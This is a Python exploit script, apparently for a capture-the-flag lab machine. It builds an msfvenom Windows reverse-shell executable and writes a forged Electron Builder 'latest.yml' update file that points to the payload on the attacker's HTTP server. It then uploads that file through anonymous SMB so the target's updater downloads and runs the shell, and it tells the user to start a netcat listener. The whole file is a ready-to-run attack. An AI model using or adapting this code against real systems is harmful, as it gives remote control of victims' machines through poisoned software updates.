import netifaces as ni
import subprocess
import sys
import argparse
import os
from pathlib import Path
import hashlib
import base64
from smb.SMBConnection import SMBConnection
import binascii

def get_ip(interface):
    """find your IP on a given interface"""
    ni.ifaddresses(interface)
    ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    print("IP Address on interface " + interface + ": " + ip)
    
    return ip

def gen_payload(ip, port, payload, dir):
    """generate an msfvenom payload with given IP address and port"""

    # cmd_str = 'msfvenom -a x86 --platform windows -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -f exe -o "' + dir + 'heedv1\'Setup1.0.1.exe"'

    cmd_str = 'msfvenom -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -f exe -o "' + dir + 'heed\'setup.exe"'

    print("Running command: " + cmd_str)
    
    subprocess.call(cmd_str, shell=True)

def get_payload(args, ip, port, path):
    """generate a payload with msfvenom, calculate its size and sha512 sum
    if a payload has already been generated, just calculate its size and sha512 sum"""

    print("\n=== Generating Payload ===\n")

    payload_path = ""

    payload_name = 'heed\'setup.exe'

    #get payload options, taking --payload as priority over --msf_payload if both provided
    if args.payload is not None:
        payload_path = Path(args.payload)

        print("Payload Path: " + str(payload_path))

    else:
        if args.msf_payload is not None:
            #get payload to use with msfvenom
            msf_payload = args.msf_payload

            print("Using payload " + str(msf_payload) + " with msfvenom")
        
        else:
            #default payload
            # msf_payload = "windows/x64/shell_reverse_tcp"
            msf_payload = "windows/shell_reverse_tcp"

            print("No --msf_payload or --payload flag provided. Using default windows/shell_reverse_tcp payload and generating with msfvenom")

        #generate shell payload
        gen_payload(ip, port, msf_payload, path)

        payload_path = path + payload_name
        print("Payload saved at: " + payload_path)
    
    #get size of payload
    size = os.path.getsize(Path(payload_path))
    print("Size: " + str(size))

    sum = gen_checksum(Path(payload_path))

    return payload_name, size, sum

def gen_checksum(filepath):
    """generate a sha512 hash of the file and base64 encode it"""

    #set a buffer size to hash in chunks
    BUF_SIZE = 65536

    sha512 = hashlib.sha512()

    with open(filepath, 'rb') as f:
        while True:
            data = f.read(BUF_SIZE)
            if not data:
                break
            sha512.update(data)

    # b64 = base64.b64encode(sha512.digest()).decode('utf-8')
    b64 = base64.b64encode(binascii.unhexlify(sha512.hexdigest())).decode('utf-8')
    # b64 = base64.b64encode(sha512.hexdigest()).decode('utf-8')

    print("Base64-encoded SHA512-sum of payload: " + b64)

    return b64

def gen_yaml(ip, payload, size, sum, dir):

    print("\n=== Generating YAML File ===\n")

    yml_string = ("version: 2.1.9\n"
        "path: http://{ip}/{payload}\n"
        "sha512: {sha}"
    ).format(ip=ip, payload=payload, sha=sum)
    
    print(yml_string)

    yml_path = dir + "/latest.yml"

    with open(yml_path, 'w') as f:
        f.write(yml_string)
        f.close()

    print("\nYAML saved at " + yml_path)

    return yml_path

def smb_upload(yml_path):

    print("\n=== Uploading to SMB ===\n")

    #set client details
    userID = "whoever"
    password = ""
    client_machine_name = "client"

    #set server details
    server_name = "ATOM" #netbios name
    server_ip = "10.10.10.237"
    domain_name = "atom.htb"

    #create and open connection
    conn = SMBConnection(userID, password, client_machine_name, server_name, domain=domain_name, use_ntlm_v2=True,
                     is_direct_tcp=True)

    conn.connect(server_ip, 445)

    folders = ['client1', 'client2', 'client3']

    #upload yml file
    with open(yml_path, 'rb') as file:
        # conn.storeFile('client1', 'latest.yml', file)
        for folder in folders:
            resp = conn.storeFile('Software_Updates', '{}/latest.yml'.format(folder), file)
            print("Bytes uploaded to " + folder + ": " + str(resp))

    conn.close()

def main():
    parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")

    #positional arguments
    parser.add_argument("ip", help="Target IP address")

    #named parameters/flags
    parser.add_argument("-p", "--payload", help="The path to an existing payload. Specify this if you don't want to generate one with msfvenom", dest="payload")
    parser.add_argument("-m", "--msf_payload", help="Msfvenom payload to use. Default is windows/shell_reverse_tcp", dest="msf_payload")
    parser.add_argument("-a", "--lip", help="Local IP address to listen on. Specify either this or --lint", dest="lip")
    parser.add_argument("-i", "--lint", help="Local interface to listen on. Specify either this or --lip", dest="lint")
    parser.add_argument("-P", "--lport", help="Local port to listen on. 443 by default, may not work on non-standard ports", dest="lport")
    parser.add_argument("-d", "--dir", help="Directory to save payload and stand up server in", dest="dir")

    #parse arguments
    args = parser.parse_args()

    #default values
    path = ""
    port = "443"

    #get local IP, taking --lip as priority over --lint if both provided
    if args.lip is not None:
        ip = args.lip
        print("IP Address: " + ip)
    elif args.lint is not None:
        ip = get_ip(args.lint)
    else:
        print("You must provide one of --lip or --lint. Run python3 send-payload.py -h for usage")
        sys.exit(1)

    #get port
    arg_port = args.lport
    if arg_port is not None:
        port = arg_port

    #mkdir if doesn't exist
    arg_path = args.dir
    if arg_path is not None:
        path = arg_path
        dirpath = Path(arg_path)

        if not dirpath.is_dir():
            print("Directory not found - creating directory")
            dirpath.mkdir()

    # remind user to start a listener
    # in future, start python server in a thread
    print("Make sure to start required listeners before continuing.\nRun a netcat listener to catch your shell: sudo nc -lnvp {port}\nRun a Python Server to serve your shell in {dir}: sudo python3 -m http.server 80".format(port=port, dir=path))
    input("Press enter to continue once you've started your listeners...\n")
    
    payload_name, size, sum = get_payload(args, ip, port, path)

    yml_path = gen_yaml(ip, payload_name, size, sum, arg_path)

    smb_upload(yml_path)

if __name__ == '__main__':
    main()